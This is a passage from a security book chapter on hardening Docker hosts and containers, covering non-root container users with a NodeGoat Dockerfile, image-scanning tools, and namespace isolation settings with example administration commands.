<p>In order to run containers as a non-root user, the user needs to be added in the (preferably base) image (<code>Dockerfile</code>) if it is under your control, and set before any commands you want run as a non-root user. Here is an example of the <a href="https://github.com/owasp/nodegoat">NodeGoat</a> image:</p>

<figure class="code">
  <figcaption>NodeGoat Dockerfile</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code>FROM node:4.4
<code class="lineno"> 2 </code>
<code class="lineno"> 3 </code># Create an environment variable in our image for the non-root user we want to use.
<code class="lineno"> 4 </code>ENV user nodegoat_docker
<code class="lineno"> 5 </code>ENV workdir /usr/src/app/
<code class="lineno"> 6 </code>
<code class="lineno"> 7 </code># Home is required for npm install. System account with no ability to login to shell
<code class="lineno"> 8 </code>RUN useradd --create-home --system --shell /bin/false $user
<code class="lineno"> 9 </code>
<code class="lineno">10 </code>RUN mkdir --parents $workdir
<code class="lineno">11 </code>WORKDIR $workdir
<code class="lineno">12 </code>COPY package.json $workdir
<code class="lineno">13 </code>
<code class="lineno">14 </code># chown is required by npm install as a non-root user.
<code class="lineno">15 </code>RUN chown $user:$user --recursive $workdir
<code class="lineno">16 </code># Then all further actions including running the containers should
<code class="lineno">17 </code># be done under non-root user, unless root is actually required.
<code class="lineno">18 </code>USER $user
<code class="lineno">19 </code>
<code class="lineno">20 </code>RUN npm install
<code class="lineno">21 </code>COPY . $workdir
<code class="lineno">22 </code>
<code class="lineno">23 </code># Permissions need to be reapplied, due to how docker applies root to new files.
<code class="lineno">24 </code>USER root
<code class="lineno">25 </code>RUN chown $user:$user --recursive $workdir
<code class="lineno">26 </code>RUN chmod --recursive o-wrx $workdir
<code class="lineno">27 </code>
<code class="lineno">28 </code>RUN ls -liah
<code class="lineno">29 </code>RUN ls ../ -liah
<code class="lineno">30 </code>USER $user
</pre></div>

</figure>

<p>As you can see on line 4 we create our <code>nodegoat_docker</code> user.<br />
On line 8 we add our non-root user to the image with no ability to login.<br />
On line 15 we change the ownership of the <code>$workdir</code> so our non-root user has access to do the things that we normally have permissions to do without root, such as installing npm packages and copying files, as we see on line 20 and 21, but first we need to switch to our non-root user on line 18. On lines 25 and 26 we need to reapply ownership and permissions due to the fact that docker does not <code>COPY</code> according to the user you are set to run commands as.</p>

<p>Without reapplying the ownership and permissions of the non-root user as seen above on lines 25 and 26, the container directory listings would look like this:</p>

<figure class="code">
  <figcaption>No reapplication of ownership and permissions</figcaption>

<div class="highlight"><pre><code></code>Step 12 : RUN ls -liah
 ---&gt; Running in f8692fc32cc7
total 116K
13 drwxr-xr-x   9 nodegoat_docker nodegoat_docker 4.0K Sep 13 09:00 .
12 drwxr-xr-x   7 root            root            4.0K Sep 13 09:00 ..
65 drwxr-xr-x   8 root            root            4.0K Sep 13 08:59 .git
53 -rw-r--r--   1 root            root             178 Sep 12 04:22 .gitignore
69 -rw-r--r--   1 root            root            1.9K Nov 21  2015 .jshintrc
61 -rw-r--r--   1 root            root              55 Nov 21  2015 .nodemonignore
58 -rw-r--r--   1 root            root             715 Sep 13 08:59 Dockerfile
55 -rw-r--r--   1 root            root            6.6K Sep 12 04:16 Gruntfile.js
60 -rw-r--r--   1 root            root             11K Nov 21  2015 LICENSE
68 -rw-r--r--   1 root            root              48 Nov 21  2015 Procfile
64 -rw-r--r--   1 root            root            5.6K Sep 12 04:22 README.md
56 drwxr-xr-x   6 root            root            4.0K Nov 21  2015 app
66 -rw-r--r--   1 root            root             527 Nov 15  2015 app.json
54 drwxr-xr-x   3 root            root            4.0K May 16 11:41 artifacts
62 drwxr-xr-x   3 root            root            4.0K Nov 21  2015 config
57 -rw-r--r--   1 root            root             244 Sep 13 04:51 docker-compose.yml
67 drwxr-xr-x 498 root            root             20K Sep 12 03:50 node_modules
63 -rw-r--r--   1 root            root            1.4K Sep 12 04:22 package.json
52 -rw-r--r--   1 root            root            4.6K Sep 12 04:01 server.js
59 drwxr-xr-x   4 root            root            4.0K Nov 21  2015 test
 ---&gt; ad42366b24d7
Removing intermediate container f8692fc32cc7
Step 13 : RUN ls ../ -liah
 ---&gt; Running in 4074cc02dd1d
total 12K
12 drwxr-xr-x  7 root            root            4.0K Sep 13 09:00 .
11 drwxr-xr-x 32 root            root            4.0K Sep 13 09:00 ..
13 drwxr-xr-x  9 nodegoat_docker nodegoat_docker 4.0K Sep 13 09:00 app
</pre></div>

</figure>

<p>With reapplication of the ownership and permissions of the non-root user, as the <code>Dockerfile</code> is currently above, the container directory listings look like the following:</p>

<figure class="code">
  <figcaption>With reapplication of ownership and permissions</figcaption>

<div class="highlight"><pre><code></code>Step 15 : RUN ls -liah
 ---&gt; Running in 8662e1657d0f
total 116K
13 drwxr-x---   21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 .
12 drwxr-xr-x    9 root            root            4.0K Sep 13 08:51 ..
65 drwxr-x---   20 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 .git
53 -rw-r-----    1 nodegoat_docker nodegoat_docker  178 Sep 12 04:22 .gitignore
69 -rw-r-----    1 nodegoat_docker nodegoat_docker 1.9K Nov 21  2015 .jshintrc
61 -rw-r-----    1 nodegoat_docker nodegoat_docker   55 Nov 21  2015 .nodemonignore
58 -rw-r-----    1 nodegoat_docker nodegoat_docker  884 Sep 13 08:46 Dockerfile
55 -rw-r-----    1 nodegoat_docker nodegoat_docker 6.6K Sep 12 04:16 Gruntfile.js
60 -rw-r-----    1 nodegoat_docker nodegoat_docker  11K Nov 21  2015 LICENSE
68 -rw-r-----    1 nodegoat_docker nodegoat_docker   48 Nov 21  2015 Procfile
64 -rw-r-----    1 nodegoat_docker nodegoat_docker 5.6K Sep 12 04:22 README.md
56 drwxr-x---   14 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app
66 -rw-r-----    1 nodegoat_docker nodegoat_docker  527 Nov 15  2015 app.json
54 drwxr-x---    5 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 artifacts
62 drwxr-x---    5 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 config
57 -rw-r-----    1 nodegoat_docker nodegoat_docker  244 Sep 13 04:51 docker-compose.yml
67 drwxr-x--- 1428 nodegoat_docker nodegoat_docker  20K Sep 13 08:51 node_modules
63 -rw-r-----    1 nodegoat_docker nodegoat_docker 1.4K Sep 12 04:22 package.json
52 -rw-r-----    1 nodegoat_docker nodegoat_docker 4.6K Sep 12 04:01 server.js
59 drwxr-x---    8 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 test
 ---&gt; b88d816315b1
Removing intermediate container 8662e1657d0f
Step 16 : RUN ls ../ -liah
 ---&gt; Running in 0ee2dcc889a6
total 12K
12 drwxr-xr-x  9 root            root            4.0K Sep 13 08:51 .
11 drwxr-xr-x 34 root            root            4.0K Sep 13 08:51 ..
13 drwxr-x--- 21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app
</pre></div>

</figure>

<p>An alternative to setting the non-root user in the <code>Dockerfile</code>, is to set it in the <code>docker-compose.yml</code>, providing the non-root user has been added to the image in the <code>Dockerfile</code>. In the case of NodeGoat, the mongo <code>Dockerfile</code> is maintained by DockerHub, and it adds a user called <code>mongodb</code>. Then in the NodeGoat projects <code>docker-compose.yml</code>, we just need to set the user, as seen on line 13 below:</p>

<figure class="code" id="nodegoat-docker-compose.yml">
  <figcaption>NodeGoat docker-compose.yml</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code>version: "2.0"
<code class="lineno"> 2 </code>
<code class="lineno"> 3 </code>services:
<code class="lineno"> 4 </code>  web:
<code class="lineno"> 5 </code>    build: .
<code class="lineno"> 6 </code>    command: bash -c "node artifacts/db-reset.js &amp;&amp; npm start"
<code class="lineno"> 7 </code>    ports:
<code class="lineno"> 8 </code>      - "4000:4000"
<code class="lineno"> 9 </code>    links:
<code class="lineno">10 </code>      - mongo
<code class="lineno">11 </code>  mongo:
<code class="lineno">12 </code>    image: mongo:latest
<code class="lineno">13 </code>    user: mongodb
<code class="lineno">14 </code>    expose:
<code class="lineno">15 </code>      - "27017"
</pre></div>

</figure>

<p>Alternatively, a container may be run as a non-root user by<br />
<code>docker run -it --user lowprivuser myimage</code><br />
but this is not ideal, the specific user should usually be part of the build.</p>

<h5 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers">Hardening Docker Host, Engine and Containers</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionDIFFICULT.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Make sure you keep your host kernel well patched, as it is a huge attack surface, with all of your containers accessing it via System calls.</p>

<p>The space for tooling to help find vulnerabilities in code, packages, etc within your Docker images has been noted, and <a href="https://community.alfresco.com/community/ecm/blog/2015/12/03/docker-security-tools-audit-and-vulnerability-assessment/">tools provided</a>. The following is a sorted list of what feels like does the least and is the simplest in terms of security/hardening features to what does the most, not understating tools that do a little, but do it well.</p>

<p>These tools should form a part of your secure and trusted build pipeline / <a href="https://blog.acolyer.org/2017/04/03/a-study-of-security-vulnerabilities-on-docker-hub/">software supply-chain</a>.</p>

<h6 id="leanpub-auto-haskell-dockerfile-linterhttpsgithubcomlukasmartinellihadolint">
  <a href="https://github.com/lukasmartinelli/hadolint">Haskell Dockerfile Linter</a>
</h6>

<p><em>A smarter Dockerfile linter that helps you build</em> <a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/"><em>best practice Docker images</em></a>.</p>

<h6 id="leanpub-auto-lynishttpscisofycomdownloads">
  <a href="https://cisofy.com/downloads/">Lynis</a>
</h6>

<p>is a mature, free and <a href="https://github.com/CISOfy/lynis">open source</a> auditing tool for Linux/Unix based systems. There is a <a href="https://cisofy.com/lynis/plugins/docker-containers/">Docker plugin</a> available which allows one to audit Docker, its configuration and containers, but an enterprise license is required, although it is very cheap.</p>

<h6 id="leanpub-auto-docker-benchhttpsgithubcomdockerdocker-bench-security">
  <a href="https://github.com/docker/docker-bench-security">Docker Bench</a>
</h6>

<p>is a shell script, that can be downloaded from github and executed immediately, run from a pre-built container, or using Docker Compose after git cloning. Docker Bench tests many host configurations and Docker containers against the CIS Docker Benchmark.</p>

<h6 id="leanpub-auto-coreos-clairhttpsgithubcomcoreosclair">CoreOS <a href="https://github.com/coreos/clair">Clair</a>
</h6>

<p>is an open source project that appears to do a similar job to Docker Security Scanning, but it is free. You can use it on any image you pull, to compare the hashes of the packages from every container layer within, with hashes of the <a href="https://github.com/coreos/clair/tree/f66103c7732c9a62ba1d3afc26437ae54953dc01#default-data-sources">CVE data sources</a>. You could also use Clair on your CI/CD build to stop images being deployed if they have packages with hashes that match those of the CVE data sources. quay.io was the first container registry to integrate with Clair.</p>

<h6 id="leanpub-auto-banyanops-collectorhttpsgithubcombanyanopscollector">Banyanops <a href="https://github.com/banyanops/collector">collector</a>
</h6>

<p>is a free and open source framework for static analysis of Docker images. It does more than Clair, it can optionally communicate with Docker registries, private or Docker Hub, to obtain image hashes, it can then tell Docker Daemon to pull the images locally. Collector then <code>docker run</code>s each container in turn to be inspected. Each container runs a banyan or user-specified script which outputs the results to stdout. Collector collates the containers output, and can send this to Banyan Analyser for further analysis. Collector has a <a href="https://github.com/banyanops/collector/blob/master/docs/CollectorDetails.md">pluggable, extensible architecture</a>. Collector can also: Enforce policies, such as no unauthorised user accounts, etc. Make sure components are in their correct location. Banyanops was the organisation that <a href="https://www.banyanops.com/blog/analyzing-docker-hub/">blogged</a> about the high number of vulnerable packages on Docker Hub. They have really put their money where their mouth was now.</p>

<h6 id="leanpub-auto-anchorehttpsanchorecomsolutions">
  <a href="https://anchore.com/solutions/">Anchore</a>
</h6>

<p>is a set of non-free tools providing visibility, control, analytics, compliance and governance for containers in the cloud or on-prem.<br />
There are two main parts, a hosted web service, and a set of open source CLI query tools.<br />
The hosted service selects and analyses popular container images from Docker Hub and other registries. The metadata it creates is provided as a service to the on-premise CLI tools.<br />
It performs a similar job to that of Clair, but does not look as simple. Also looks for source code secrets, API keys, passwords, etc in images.</p>

<p>Designed to integrate into your CI/CD pipeline. Integrates with Kubernetes, Docker, Jenkins, CoreOS, Mesos</p>

<h6 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-twistlock">
  <a href="https://www.twistlock.com/">TwistLock</a>
</h6>

<p>is a fairly comprehensive and complete non open source offering with a free developer edition. The following details were taken from TwistLock marketing pages:</p>

<p>Features of Trust:</p>

<ul>
  <li>Discover and manage vulnerabilities in images</li>
  <li>Uses CVE data sources similar to CoreOS Clair</li>
  <li>Can scan registries: Docker Hub, Google Container Registry, EC2 Container Registry, Artifactory, Nexus Registry, and images for vulnerabilities in code and configuration</li>
  <li>Enforce and verify standard configurations</li>
  <li>Hardening checks on images based on CIS Docker benchmark</li>
  <li>Real-time vulnerability and threat intelligence</li>
  <li>Provide out-of-box plugins for vulnerability reporting directly into Jenkins and TeamCity</li>
  <li>Provides a set of APIs for developers to access almost all of the TwistLock core functions</li>
</ul>

<p>Features of Runtime:</p>

<ul>
  <li>Policy enforcement</li>
  <li>Detect anomalies, uses open source CVE feeds, commercial threat and vulnerability sources, as well as TwistLocks own Lab research</li>
  <li>Defend and adapt against active threats and compromises using machine learning</li>
  <li>Governs access control to individual APIs of Docker Engine, Kubernetes, and Docker Swarm, providing LDAP/AD integration.</li>
</ul>

<h6 id="leanpub-auto-possible-contenders-to-watch">Possible contenders to watch</h6>

<ul>
  <li>
<a href="https://github.com/zuBux/drydock">Drydock</a> is a similar offering to Docker Bench, but not as mature at this stage</li>
  <li>
<a href="https://github.com/diogomonica/actuary">Actuary</a> is a similar offering to Docker Bench, but not as mature at this stage. I <a href="http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/">discussed</a> this project briefly with its creator Diogo Mnica, and it sounds like the focus is on creating a better way of running privileged services on swarm, instead of investing time into this.</li>
</ul>

<h6 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces">Namespaces</h6>

<ol class="numeric">
  <li>
<code>mnt</code>: Keep with the default propagation mode of <code>private</code> unless you have a very good reason to change it. If you do need to change it, think about defence in depth and employ other defence strategies.  
    <p>If you have control over the Docker host, lock down the mounting of the host systems partitions as discussed in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a> section.</p>

    <p>If you have to mount a sensitive host system directory, mount it as read-only:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> docker run -it --rm -v /etc:/hosts-etc:ro --name<code class="o">=</code>lets-mount-etc ubuntu
</pre></div>

    </figure>

    <p>If any file modifications are now attempted on <code>/etc</code> they will be unsuccessful.</p>

    <figure class="code">
      <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code> docker inspect -f <code class="s2">"{{ json .Mounts }}"</code> lets-mount-etc
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> <code class="o">[</code>
   <code class="o">{</code>
     <code class="s2">"Type"</code>:<code class="s2">"bind"</code>,
     <code class="s2">"Source"</code>:<code class="s2">"/etc"</code>,
     <code class="s2">"Destination"</code>:<code class="s2">"/hosts-etc"</code>,
     <code class="s2">"Mode"</code>:<code class="s2">"ro"</code>,
     <code class="s2">"RW"</code>:false,
     <code class="s2">"Propagation"</code>:<code class="s2">""</code>
   <code class="o">}</code>
 <code class="o">]</code>
</pre></div>

    </figure>

    <p>Also, as discussed previously, lock down the user to non-root.</p>

    <p>If you are using LSM, you will probably want to use the <code>Z</code> option as discussed in the risks section.  </p>
  </li>
  <li>
<code>PID</code>: By default enforces isolation from the containers <code>PID</code> namespace, but not from the host to the container. If you are concerned about host systems being able to access your containers, as you should be, consider putting your containers within a VM  </li>
  <li>
<code>net</code>: A network namespace is a virtualisation of the network stack, with its own network devices, IP routing tables, firewall rules and ports.<br />
When a network namespace is created the only network interface that is created is the loopback interface, which is down until brought up.<br />
Each network interface whether physical or virtual, can only reside in one namespace, but can be moved between namespaces.  
    <p>When the last process in a network namespace terminates, the namespace will be destroyed and destroy any virtual interfaces within it and move any physical network devices back to the initial network namespace, not the process parent.</p>

    <p><strong>Docker and Network Namespaces</strong></p>

    <p>A Docker network is analogous to a Linux kernel network namespace.</p>

    <p>When Docker is installed, three networks are created <code>bridge</code>, <code>host</code> and <code>null</code>, which you can think of as network namespaces. These can be seen by running: <a href="https://docs.docker.com/engine/reference/commandline/network_ls/"><code>docker network ls</code></a></p>

    <figure class="code">
<div class="highlight"><pre><code></code> NETWORK ID    NAME              DRIVER   SCOPE
 9897a3063354  bridge            bridge   <code class="nb">local</code>
 fe179428ccd4  host              host     <code class="nb">local</code>
 a81e8669bda7  none              null     <code class="nb">local</code>
</pre></div>

    </figure>

    <p>When you run a container, if you want to override the default network of <code>bridge</code>, you can specify which network you want to run the container in with the <code>--network</code> flag as the following:<br />
 <code>docker run --network=&lt;network&gt;</code></p>

    <p>The bridge can be seen by running <code>ifconfig</code> on the host:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> docker0   Link encap:Ethernet  HWaddr <code class="m">05</code>:22:bb:08:41:b7  
           inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
           inet6 addr: fe80::42:fbff:fe80:57a5/64 Scope:Link
</pre></div>

    </figure>

    <p>When the Docker engine (CLI) client or API tells the Docker daemon to run a container, part of the process allocates a bridged interface, unless specified otherwise, that allows processes within the container to communicate to the system host via the virtual Ethernet bridge.</p>

    <p>Virtual Ethernet interfaces when created are always created as a pair. You can think of them as one interface on each side of a namespace wall with a tube through the wall connecting them. Packets come in one interface and pop out the other, and visa versa.</p>

    <p><strong>Creating and Listing Network NameSpaces</strong></p>

    <p>Some of these commands you will need to run as root.</p>

    <p>Create:</p>

    <figure class="code">
      <figcaption>Syntax</figcaption>

<div class="highlight"><pre><code></code> ip netns add &lt;yournamespacename&gt;
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code> ip netns add testnamespace
</pre></div>

    </figure>

    <p>This ip command adds a bind mount point for the <code>testnamespace</code> namespace to <code>/var/run/netns/</code>. When the <code>testnamespace</code> namespace is created, the resulting file descriptor keeps the network namespace alive/persisted. This allows system administrators to apply configuration to the network namespace without fear that it will disappear when no processes are within it.</p>

    <figure class="code">
      <figcaption>Verify it was added</figcaption>

<div class="highlight"><pre><code></code> ip netns list
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> testnamespace
</pre></div>

    </figure>

    <p>A network namespace added in this way however can not be used for a docker container. In order to create a <a href="https://docs.docker.com/engine/userguide/networking/">Docker network</a> called <code>kimsdockernet</code> run the following command:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> <code class="c1"># bridge is the default driver, so not required to be specified</code>
 docker network create --driver bridge kimsdockernet
</pre></div>

    </figure>

    <p>You can then follow this with a<br />
 <code>docker network ls</code><br />
 to confirm that the network was added. You can base your network on one of the existing <a href="https://docs.docker.com/engine/reference/run/#network-settings">network drivers</a> created by docker, the bridge driver is used by default.</p>

    <p><a href="https://docs.docker.com/engine/reference/run/#network-bridge"><code>bridge</code></a>: As seen above with the <code>ifconfig</code> listing on the host system, an interface is created called docker0 when Docker is installed. A pair of veth (Virtual Ethernet) interfaces are created when the container is run with this <code>--network</code> option. The <code>veth</code> on the outside of the container will be attached to the bridge, the other <code>veth</code> is put inside the containers namespace, along with the existing loopback interface.<br />
 <a href="https://docs.docker.com/engine/reference/run/#network-none"><code>none</code></a>: There will be no networking in the container other than the loopback interface which was created when the network namespace was created, and has no routes to external traffic.<br />
 <a href="https://docs.docker.com/engine/reference/run/#network-host"><code>host</code></a>: Use the network stack that the host system uses inside the container. The <code>host</code> mode is more performant than the <code>bridge</code> mode due to using the hosts native network stack, but also less secure.<br />
 <a href="https://docs.docker.com/engine/reference/run/#network-container"><code>container</code></a>: Allows you to specify another container to use its network stack.</p>

    <p>By running<br />
 <code>docker network inspect kimsdockernet</code><br />
 before starting the container and then again after, you will see the new container added to the <code>kimsdockernet</code> network.</p>

    <p>Now you can run your container using your new network:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> docker run -it --network kimsdockernet --rm --name<code class="o">=</code>container0 ubuntu
</pre></div>

    </figure>

    <p>When one or more processes (Docker containers in this case) use the <code>kimsdockernet</code> network, it can also be seen opened by the presence of its file descriptor at:</p>

    <p><code>/var/run/docker/netns/&lt;filedescriptor&gt;</code></p>

    <p>You can also see that the container named <code>container0</code> has a network namespace by running the following command, which shows the file handles for the namespaces, and not just the network namespace:</p>

    <figure class="code">
      <figcaption>Query Namespaces</figcaption>

<div class="highlight"><pre><code></code> sudo ls /proc/<code class="sb">`</code>docker inspect -f <code class="s1">'{{ .State.Pid }}'</code> container0<code class="sb">`</code>/ns -liah
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code> total <code class="m">0</code>
 <code class="m">1589018</code> dr-x--x--x <code class="m">2</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">16</code>:35 .
 <code class="m">1587630</code> dr-xr-xr-x <code class="m">9</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">16</code>:35 ..
 <code class="m">1722671</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">17</code>:33 cgroup -&gt; cgroup:<code class="o">[</code><code class="m">4026531835</code><code class="o">]</code>
 <code class="m">1722667</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">17</code>:33 ipc -&gt; ipc:<code class="o">[</code><code class="m">4026532634</code><code class="o">]</code>
 <code class="m">1722670</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">17</code>:33 mnt -&gt; mnt:<code class="o">[</code><code class="m">4026532632</code><code class="o">]</code>
 <code class="m">1589019</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">16</code>:35 net -&gt; net:<code class="o">[</code><code class="m">4026532637</code><code class="o">]</code>
 <code class="m">1722668</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">17</code>:33 pid -&gt; pid:<code class="o">[</code><code class="m">4026532635</code><code class="o">]</code>
 <code class="m">1722669</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">17</code>:33 user -&gt; user:<code class="o">[</code><code class="m">4026531837</code><code class="o">]</code>
 <code class="m">1722666</code> lrwxrwxrwx <code class="m">1</code> root root <code class="m">0</code> Mar <code class="m">14</code> <code class="m">17</code>:33 uts -&gt; uts:<code class="o">[</code><code class="m">4026532633</code><code class="o">]</code>
</pre></div>

    </figure>

    <p>If you run<br />
 <code>ip netns list</code><br />
 again, you may think that you should be able to see the Docker network, but you will not, unless you create the following symlink:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> ln -s /proc/<code class="sb">`</code>docker inspect -f <code class="s1">'{{.State.Pid}}'</code> container0<code class="sb">`</code>/ns/net /var/run/netns/container0
 <code class="c1"># Don't forget to remove the symlink once the container terminates,</code>
 <code class="c1"># else it will be dangling.</code>
</pre></div>

    </figure>

    <p>If you want to run a command inside of the Docker network of a container, you can use the <a href="http://man7.org/linux/man-pages/man1/nsenter.1.html"><code>nsenter</code></a> command of the <code>util-linux</code> package:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> <code class="c1"># Show the ethernet state:</code>
 nsenter -t <code class="sb">`</code>docker inspect -f <code class="s1">'{{ .State.Pid }}'</code> container0<code class="sb">`</code> -n ifconfig
 <code class="c1"># Or</code>
 nsenter -t <code class="sb">`</code>docker inspect -f <code class="s1">'{{ .State.Pid }}'</code> container0<code class="sb">`</code> -n ip addr show
 <code class="c1"># Or</code>
 nsenter --net<code class="o">=</code>/var/run/docker/netns/&lt;filedescriptor&gt; ifconfig
 <code class="c1"># Or</code>
 nsenter --net<code class="o">=</code>/var/run/docker/netns/&lt;filedescriptor&gt; ip addr show
</pre></div>

    </figure>

    <p><strong>Deleting Network NameSpaces</strong></p>

    <p>The following command will remove the bind mount for the specified namespace. The namespace will continue to persist until all processes within it are terminated, at which point any virtual interfaces within it will be destroyed and any physical network devices if they were assigned, would be moved back to the initial network namespace, not the process parent.</p>

    <figure class="code">
      <figcaption>Syntax</figcaption>

<div class="highlight"><pre><code></code> ip netns delete &lt;yournamespacename&gt;
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code> ip netns delete testnamespace  
</pre></div>

    </figure>

    <figure class="code">
      <figcaption>To remove a docker network</figcaption>

<div class="highlight"><pre><code></code> docker network rm kimsdockernet
</pre></div>

    </figure>

    <p>If you still have a container running, you will receive an error:<br />
 <code>Error response from daemon: network kimsdockernet has active endpoints</code><br />
 Stop your container and try again.</p>

    <p>It would pay to also <a href="https://docs.docker.com/engine/userguide/networking/default_network/container-communication/">understand container communication</a> with each other.</p>

    <p>Also checkout the <a href="chap07.html#additional-resources-vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces">Additional Resources</a>.  </p>
  </li>
  <li>
<code>UTS</code> Do not start your containers with the <code>--uts</code> flag set to <code>host</code><br />
As mentioned in the CIS_Docker_1.13.0_Benchmark <em>Sharing the UTS namespace with the host provides full permission to the container to change the hostname of the host. This is insecure and should not be allowed.</em>. You can test that the container is not sharing the hosts UTS namespace by making sure that the following command returns nothing, instead of <code>host</code>:
    <figure class="code">
<div class="highlight"><pre><code></code> docker ps --quiet --all <code class="p">|</code> xargs docker inspect --format <code class="s1">'{{ .Id }}: UTSMode={{ .HostConfig.U\</code>
<code class="s1">TSMode }}'</code>
</pre></div>

    </figure>
  </li>
  <li>
<code>IPC</code>: In order to stop another untrusted container sharing your containers IPC namespace, you could isolate all of your trusted containers in a VM, or if you are using some type of orchestration, that will usually have functionality to isolate groups of containers. If you can isolate your trusted containers sufficiently, then you may still be able to share the IPC namespace of other near by containers.</li>
  <li>
<code>user</code>: If you have read the <a href="chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces">risks section</a> and still want to enable support for user namespaces, you first need to confirm that the host user of the associated containers <code>PID</code> is not root by running the following CIS Docker Benchmark recommended commands:
    <figure class="code">
<div class="highlight"><pre><code></code> ps -p <code class="k">$(</code>docker inspect --format<code class="o">=</code><code class="s1">'{{ .State.Pid }}'</code> &lt;CONTAINER ID&gt;<code class="k">)</code> -o pid,user
</pre></div>

    </figure>

    <p>Or, you can run the following command and make sure that the <code>userns</code> is listed under the <code>SecurityOptions</code></p>

    <figure class="code">
<div class="highlight"><pre><code></code> docker info --format <code class="s1">'{{ .SecurityOptions }}'</code>
</pre></div>

    </figure>

    <p>Once you have confirmed that your containers are not being run as root, you can look at enabling user namespace support on the Docker daemon.</p>

    <p>The <code>/etc/subuid</code> and <code>/etc/subgid</code> host files will be read for the user and optional group supplied to the <code>--userns-remap</code> option of <code>dockerd</code>.</p>

    <p>The <code>--userns-remap</code> option accepts the following value types:</p>

    <ul>
      <li><code>uid</code></li>
      <li><code>uid:gid</code></li>
      <li><code>username</code></li>
      <li>
<code>username:groupname</code>  </li>
    </ul>

    <p>The username must exist in the <code>/etc/passwd</code> file, the <code>sbin/nologin</code> users are <a href="https://success.docker.com/KBase/Introduction_to_User_Namespaces_in_Docker_Engine">valid also</a>. Subordinate user Id and group Id ranges need to be specified in <code>/etc/subuid</code> and <code>/etc/subuid</code> respectively.</p>

    <p><em>The UID/GID we want to remap to <a href="https://success.docker.com/KBase/Introduction_to_User_Namespaces_in_Docker_Engine">does not need to match</a> the UID/GID of the username in <code>/etc/passwd</code></em>. It is the entity in the <code>/etc/subuid</code> that will be the owner of the Docker daemon and the containers it runs. The value you supply to <code>--userns-remap</code> if numeric Ids, will be translated back to the valid user or group names of <code>/etc/passwd</code> and <code>/etc/group</code> which must exist, if username, groupname, they must match the entities in <code>/etc/passwd</code>, <code>/etc/subuid</code>, and <code>/etc/subgid</code>.</p>

    <p>Alternatively if you do not want to specify your own user and/or user:group, you can provide the <code>default</code> value to <code>--userns-remap</code>, and a default user of <code>dockremap</code> along with subordinate uid and gid ranges will be created in <code>/etc/passwd</code> and <code>/etc/group</code> if it does not already exist. Then the <code>/etc/subuid</code> and <code>/etc/subgid</code> files will be <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#starting-the-daemon-with-user-namespaces-enabled">populated</a> with a contiguous 65536 length range of subordinate user and group Ids respectively, starting at the offset of the existing entries in those files.</p>

    <figure class="code">
<div class="highlight"><pre><code></code> <code class="c1"># As root, run:</code>
 dockerd --userns-remap<code class="o">=</code>default
</pre></div>

    </figure>

    <p>If <code>dockremap</code> does not already exist, it will be created:</p>

    <figure class="code">
      <figcaption>/etc/subuid and /etc/subgid</figcaption>

<div class="highlight"><pre><code></code> &lt;existinguser&gt;:100000:65536
 dockremap:165536:65536
</pre></div>

    </figure>

    <p>There are rules around providing multiple range segments in the <code>/etc/subuid</code>, <code>/etc/subgid</code> files, but that is beyond the scope of what I am providing here. For those advanced scenario details, check out the <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#detailed-information-on-subuidsubgid-ranges">Docker engine reference</a>. The simple scenario is that we use a single contiguous range like you see in the above example, this will cause Docker to map the hosts user and group ids to the container process using as much of the <code>165536:65536</code> range as necessary. So for example the hosts root user would be mapped to <code>165536</code>, the next host user would be mapped to container user <code>165537</code>, and so on until the 65536 possible ids are all mapped. Processes run as root inside the container are owned by the subordinate uid outside of the container.</p>

    <p><strong>Disabling user namespace for specific containers</strong></p>

